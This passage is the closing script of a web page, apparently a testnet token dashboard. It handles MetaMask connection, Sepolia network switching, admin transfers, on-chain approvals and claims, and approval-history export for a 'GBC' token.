            method: "wallet_addEthereumChain",
            params: [{
              chainId: SEPOLIA_CHAIN_ID_HEX,
              chainName: "Sepolia",
              nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
              rpcUrls: ["https://rpc.sepolia.org"],
              blockExplorerUrls: ["https://sepolia.etherscan.io"]
            }]
          });
          await refreshAll();
        }catch(e2){
          alert("Could not add Sepolia network. Please add it manually in MetaMask.");
        }
      } else {
        alert("Network switch cancelled or failed.");
      }
    }
  };

  window.connectWallet = async function(){
    showWeb3HelpIfNeeded();
    if (!hasWeb3()){
      alert("No Web3 detected. On Android, open this site inside MetaMask Browser.");
      return;
    }
    try{
      provider = new ethers.providers.Web3Provider(window.ethereum, "any");
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      walletAddress = await signer.getAddress();
      walletEl.textContent = shortAddr(walletAddress);

      window.ethereum.on?.("accountsChanged", async () => {
        try{
          signer = provider.getSigner();
          walletAddress = await signer.getAddress();
          walletEl.textContent = shortAddr(walletAddress);
          await refreshAll();
        }catch(e){}
      });
      window.ethereum.on?.("chainChanged", async () => {
        await refreshAll();
      });

      await refreshAll();

      const cid = await getChainIdHex();
      if (cid && cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
        setTxStatus("warn", "Please switch to Sepolia to use this wallet.");
        switchBtn.disabled = false;
      } else {
        setTxStatus("ok", "Connected. Ready.");
      }

      updateEmailAutofillBasics();
    }catch(err){
      console.error(err);
      alert("Connection failed or cancelled.");
    }
  };

  async function getBalance(){
    if (!signer || !walletAddress){
      balEl.textContent = "0";
      return;
    }
    try{
      const cid = await getChainIdHex();
      if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
        balEl.textContent = "‚Äî";
        return;
      }
      const c = getWriteContract();
      const balance = await c.balanceOf(walletAddress);
      balEl.textContent = ethers.utils.formatUnits(balance, tokenDecimals);
    }catch(err){
      console.error("Error reading balance:", err);
      balEl.textContent = "Error";
    }
  }

  async function refreshMyEntitlementStatus(){
    if (!provider || !walletAddress){
      meApproved.textContent = "‚Äî";
      meClaimed.textContent = "‚Äî";
      return;
    }
    try{
      const cid = await getChainIdHex();
      if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
        meApproved.textContent = "‚Äî";
        meClaimed.textContent = "‚Äî";
        return;
      }
      const c = getReadContract();
      const [ap, cl] = await Promise.all([
        c.approved(walletAddress).catch(()=>null),
        c.hasClaimed(walletAddress).catch(()=>null)
      ]);
      meApproved.textContent = (ap === null) ? "N/A" : (ap ? "YES ‚úÖ" : "NO ‚õî");
      meClaimed.textContent = (cl === null) ? "N/A" : (cl ? "YES ‚úÖ" : "NO");
    }catch(_e){
      meApproved.textContent = "Error";
      meClaimed.textContent = "Error";
    }
  }

  async function refreshAll(){
    await refreshNetworkUI();

    if (provider) {
      const okCode = await ensureContractCodeExists();
      if (!okCode) {
        setTxStatus("bad", "Contract address has no code on this network. Check CONTRACT_ADDRESS / network.");
      }
    }

    await loadTokenMeta();
    await loadAdminAndCap();
    await getBalance();
    await refreshMyEntitlementStatus();
    unlockActions();
  }

  // =========================
  // Step 4: Recipient validation (checksum + ENS)
  // =========================
  async function resolveRecipient(inputValue){
    const raw = (inputValue || "").trim();
    if (!raw) return { ok:false, address:null, display:"", warning:"" };

    if (raw.includes(".") && provider){
      try{
        const resolved = await provider.resolveName(raw);
        if (resolved && ethers.utils.isAddress(resolved)){
          const checksummed = ethers.utils.getAddress(resolved);
          return { ok:true, address:checksummed, display:`${raw} ‚Üí ${shortAddr(checksummed)}`, warning:"" };
        }
        return { ok:false, address:null, display:raw, warning:"Could not resolve ENS name." };
      }catch(_e){
        return { ok:false, address:null, display:raw, warning:"ENS lookup failed." };
      }
    }

    if (!ethers.utils.isAddress(raw)){
      return { ok:false, address:null, display:raw, warning:"Invalid address format." };
    }
    try{
      const checksummed = ethers.utils.getAddress(raw);
      return { ok:true, address:checksummed, display:shortAddr(checksummed), warning:"" };
    }catch(_e){
      return { ok:false, address:null, display:raw, warning:"Address checksum failed." };
    }
  }

  let recipientResolveTimer = null;
  document.getElementById("sendAddress").addEventListener("input", () => {
    clearTimeout(recipientResolveTimer);
    recipientHint.textContent = "";
    recipientResolveTimer = setTimeout(async () => {
      const v = document.getElementById("sendAddress").value;
      const r = await resolveRecipient(v);
      if (!v.trim()){
        recipientHint.innerHTML = "";
        return;
      }
      if (r.ok){
        recipientHint.innerHTML = `<span class="chip ok"><i class="fa-solid fa-check"></i> Valid</span> <span class="mono">${r.display}</span>`;
      } else {
        recipientHint.innerHTML = `<span class="chip bad"><i class="fa-solid fa-xmark"></i> Invalid</span> <span class="mono">${r.display}</span> <span class="small"> ${r.warning}</span>`;
      }
    }, 300);
  });

  document.getElementById("sendAmount").addEventListener("input", () => {
    const a = document.getElementById("sendAmount").value;
    if (!a) { amountHint.textContent = ""; return; }
    if (Number(a) <= 0) amountHint.innerHTML = `<span class="chip bad"><i class="fa-solid fa-xmark"></i> Invalid</span> <span class="small">Amount must be > 0</span>`;
    else amountHint.innerHTML = `<span class="chip ok"><i class="fa-solid fa-check"></i> OK</span> <span class="small">Will send ${a} GBC</span>`;
  });

  // Confirm modal helpers
  function openConfirm(payload){
    confirmError.textContent = "";
    confirmCheckbox.checked = false;
    confirmSendBtn.disabled = true;

    confirmRecipient.textContent = payload.recipientDisplay || payload.recipient;
    confirmAmount.textContent = payload.amount + " GBC";
    confirmNetwork.textContent = "Sepolia";
    confirmMode.textContent = payload.mode;

    confirmBackdrop.style.display = "flex";
    confirmBackdrop.setAttribute("aria-hidden", "false");

    confirmCheckbox.onchange = () => {
      confirmSendBtn.disabled = !confirmCheckbox.checked;
    };

    window.__pendingSend = payload;
  }

  function closeConfirm(){
    confirmBackdrop.style.display = "none";
    confirmBackdrop.setAttribute("aria-hidden", "true");
    window.__pendingSend = null;
  }

  window.closeConfirm = closeConfirm;

  window.confirmAndSend = async function(){
    const payload = window.__pendingSend;
    if (!payload) return;

    try{
      confirmSendBtn.disabled = true;
      confirmError.textContent = "";
      await doSend(payload);
      closeConfirm();
    }catch(e){
      confirmError.textContent = e?.message || "Send failed.";
      confirmSendBtn.disabled = false;
    }
  };

  // Send flow
  window.sendGBC = async function(){
    if (!signer){
      alert("Connect MetaMask first.");
      return;
    }
    const cid = await getChainIdHex();
    if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
      alert("Please switch to Sepolia first.");
      return;
    }

    await loadAdminAndCap();
    if (!isAdminWallet()){
      alert("Safety lock: connected wallet is not the on-chain admin().");
      unlockActions();
      return;
    }

    const rawRecipient = document.getElementById("sendAddress").value.trim();
    const amount = document.getElementById("sendAmount").value;

    if (!amount || Number(amount) <= 0){
      alert("Enter a valid amount.");
      return;
    }

    const rr = await resolveRecipient(rawRecipient);
    if (!rr.ok){
      alert("Recipient is not valid: " + (rr.warning || "Invalid"));
      return;
    }
    const recipient = rr.address;

    if (onlyApprovedToggle.checked){
      try{
        const cRead = getReadContract();
        const ok = await cRead.approved(recipient).catch(()=>null);
        if (ok === null){
          alert("This contract does not expose approved(address). Toggle off 'ONLY approved wallets' or update contract.");
          return;
        }
        if (!ok){
          alert("Blocked: Recipient is NOT approved on-chain.");
          return;
        }
      }catch(e){
        alert("Could not verify recipient approval. Try again.");
        return;
      }
    }

    const payload = {
      recipient,
      recipientDisplay: rr.display,
      amount: String(amount),
      mode: onlyApprovedToggle.checked ? "Admin Transfer (Approved-only ON)" : "Admin Transfer"
    };

    if (confirmToggle.checked){
      openConfirm(payload);
      return;
    }
    await doSend(payload);
  };

  async function doSend(payload){
    const cid = await getChainIdHex();
    if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
      throw new Error("Wrong network. Switch to Sepolia.");
    }

    try{
      setTxStatus("warn", "Transaction pending‚Ä¶ please confirm in MetaMask.");
      const c = getWriteContract();
      const valueWei = ethers.utils.parseUnits(String(payload.amount), tokenDecimals);

      let tx;
      try{
        tx = await c.adminTransfer(payload.recipient, valueWei);
      }catch(_e){
        tx = await c.transfer(payload.recipient, valueWei);
      }

      setTxStatus("warn", "Pending‚Ä¶ waiting for confirmation on-chain.");
      await tx.wait();

      setTxStatus("ok", `Transaction successful ‚úÖ Sent ${payload.amount} GBC to ${shortAddr(payload.recipient)}`);
      await getBalance();
    }catch(err){
      console.error(err);
      const msg = err?.data?.message || err?.message || "Transaction failed or cancelled.";
      setTxStatus("bad", msg);
      throw err;
    }
  }

  // Admin setApproved
  window.setApprovedUser = async function(){
    if (!signer){
      alert("Connect MetaMask first.");
      return;
    }
    const cid = await getChainIdHex();
    if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
      alert("Please switch to Sepolia first.");
      return;
    }

    await loadAdminAndCap();
    if (!isAdminWallet()){
      alert("Safety lock: connected wallet is not the on-chain admin().");
      unlockActions();
      return;
    }

    const userRaw = document.getElementById("approveUserAddr").value.trim();
    const allowed = document.getElementById("approveUserBool").value === "true";

    const rr = await resolveRecipient(userRaw);
    if (!rr.ok){
      alert("User address is not valid: " + (rr.warning || "Invalid"));
      return;
    }
    const user = rr.address;

    try{
      setTxStatus("warn", "Approval pending‚Ä¶ confirm in MetaMask.");
      const c = getWriteContract();
      const tx = await c.setApproved(user, allowed);
      setTxStatus("warn", "Pending‚Ä¶ waiting confirmation.");
      await tx.wait();
      setTxStatus("ok", allowed ? `Approved ‚úÖ ${shortAddr(user)} (can claim)` : `Revoked ‚õî ${shortAddr(user)} (cannot claim)`);

      // Optional convenience: autofill email with this action
      fillAdminEmailFromUI();
    }catch(err){
      console.error(err);
      const msg = err?.data?.message || err?.message || "Approval failed/cancelled.";
      setTxStatus("bad", msg);
    }
  };

  // Claim
  window.claimEntitlement = async function(){
    if (!signer){
      alert("Connect MetaMask first.");
      return;
    }
    const cid = await getChainIdHex();
    if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
      alert("Please switch to Sepolia first.");
      return;
    }
    try{
      setTxStatus("warn", "Claim pending‚Ä¶ confirm in MetaMask.");
      const c = getWriteContract();
      const tx = await c.claim();
      setTxStatus("warn", "Pending‚Ä¶ waiting confirmation.");
      await tx.wait();
      setTxStatus("ok", "Claim successful ‚úÖ");
      await getBalance();
      await refreshMyEntitlementStatus();

      // Optional convenience: autofill email with this action
      fillAdminEmailFromUI();
    }catch(err){
      console.error(err);
      const msg = err?.data?.message || err?.message || "Claim failed/cancelled.";
      setTxStatus("bad", msg);
    }
  };

  // Step 2: approvals history
  function etherscanTxUrl(txHash){
    return "https://sepolia.etherscan.io/tx/" + txHash;
  }

  async function getBlockTimestamp(blockNumber){
    try{
      const b = await provider.getBlock(blockNumber);
      if (!b) return null;
      const d = new Date(b.timestamp * 1000);
      return d.toLocaleString();
    }catch(_e){
      return null;
    }
  }

  function renderHistoryTable(rows){
    approvalsHistoryRows = rows.slice();
    if (!rows.length){
      historyBody.innerHTML = `<tr><td colspan="5" class="small">No events found in the selected range.</td></tr>`;
      return;
    }
    let html = "";
    rows.forEach(r => {
      const chipClass = r.kind === "Approval" ? "ok" : (r.kind === "Approved" ? "ok" : "bad");
      const chipText = r.kind;
      html += `
        <tr>
          <td><span class="chip ${chipClass}">${chipText}</span></td>
          <td class="mono">${r.wallet || "‚Äî"}</td>
          <td class="mono">${r.details || "‚Äî"}</td>
          <td class="mono">${r.block || "‚Äî"}<br><span class="small">${r.time || ""}</span></td>
          <td class="mono"><a class="txLink" href="${etherscanTxUrl(r.tx)}" target="_blank" rel="noreferrer">View</a><br>${shortAddr(r.tx)}</td>
        </tr>
      `;
    });
    historyBody.innerHTML = html;
  }

  window.loadApprovalHistory = async function(){
    if (!provider || !walletAddress){
      alert("Connect MetaMask first.");
      return;
    }
    const cid = await getChainIdHex();
    if (!cid || cid.toLowerCase() !== SEPOLIA_CHAIN_ID_HEX){
      alert("Switch to Sepolia first.");
      return;
    }

    const lookback = Math.max(100, Number(historyBlocks.value || 20000));
    const maxRows = Math.min(200, Math.max(5, Number(historyMax.value || 30)));

    try{
      setTxStatus("warn", "Loading history‚Ä¶");
      const currentBlock = await provider.getBlockNumber();
      const fromBlock = Math.max(0, currentBlock - lookback);

      const c = getReadContract();
      const approvalFilter = c.filters.Approval(null, null);
      const approvalEvents = await c.queryFilter(approvalFilter, fromBlock, currentBlock);

      const rows = [];
      const sliced = approvalEvents.slice(-maxRows).reverse();

      for (const ev of sliced){
        const owner = ev.args?.owner ? ethers.utils.getAddress(ev.args.owner) : null;
        const spender = ev.args?.spender ? ethers.utils.getAddress(ev.args.spender) : null;
        const value = ev.args?.value;
        const formattedValue = value ? ethers.utils.formatUnits(value, tokenDecimals) : "‚Äî";
        const time = await getBlockTimestamp(ev.blockNumber);

        rows.push({
          kind: "Approval",
          wallet: owner ? shortAddr(owner) : "‚Äî",
          details: spender ? `spender ${shortAddr(spender)} ‚Ä¢ value ${formattedValue}` : `value ${formattedValue}`,
          block: ev.blockNumber,
          time: time || "",
          tx: ev.transactionHash
        });
      }

      renderHistoryTable(rows);
      setTxStatus("ok", `History loaded ‚úÖ Found ${approvalEvents.length} Approval event(s) in range.`);
    }catch(err){
      console.error(err);
      setTxStatus("bad", err?.message || "Failed to load history.");
      renderHistoryTable([]);
    }
  };

  window.exportHistoryCSV = function(){
    const rows = approvalsHistoryRows || [];
    if (!rows.length){
      alert("No history to export. Click 'Load History' first.");
      return;
    }
    const header = ["Type","Wallet","Details","Block","Time","Tx"].join(",");
    const lines = rows.map(r => {
      const esc = (s)=> `"${String(s||"").replaceAll('"','""')}"`;
      return [r.kind, r.wallet, r.details, r.block, r.time, r.tx].map(esc).join(",");
    });
    const csv = [header, ...lines].join("\n");
    const blob = new Blob([csv], { type:"text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "gbc_approvals_history.csv";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };

  // Minor fields + P2P demo
  window.toggleMinorFields = function(){
    const checkbox = document.getElementById("claimingMinor");
    const section = document.getElementById("minorSection");
    section.style.display = checkbox.checked ? "block" : "none";
  };

  window.enforceSellLimit = function(input){
    const maxSell = 0.01125;
    if (parseFloat(input.value) > maxSell) input.value = maxSell;
  };

  let sellOffers = [];

  window.sellGBC = function(){
    const amount = parseFloat(document.getElementById("sellAmount").value);
    const buyer = document.getElementById("buyerAddress").value;
    const price = document.getElementById("sellPrice").value;

    if (!amount || amount <= 0 || amount > 0.01125) {
      alert("Amount must be between 0.0001 and 0.01125 GBC.");
      return;
    }
    if (!buyer || !buyer.trim()) {
      alert("Please enter the buyer wallet address.");
      return;
    }

    sellOffers.push({ amount, buyer: buyer.trim(), price: price || "N/A" });
    document.getElementById("sellStatus").innerText = `Offer saved locally for ${buyer.trim()} (demo).`;
  };

  window.checkOffers = function(){
    const buyerLookup = document.getElementById("buyerLookup").value.trim();
    const resultBox = document.getElementById("inboxResults");
    const results = sellOffers.filter(o => o.buyer === buyerLookup);

    if (results.length === 0) {
      resultBox.innerHTML = "<p>No offers found for this wallet.</p>";
    } else {
      let html = "<ul>";
      results.forEach(o => { html += `<li>${o.amount} GBC offered at $${o.price}</li>`; });
      html += "</ul>";
      resultBox.innerHTML = html;
    }
  };

  // Init
  (function init(){
    showWeb3HelpIfNeeded();
    refreshNetworkUI();
    contractLabel.textContent = CONTRACT_ADDRESS;
    updateEmailAutofillBasics();
    unlockActions();
  })();
</script>

</body>
</html>
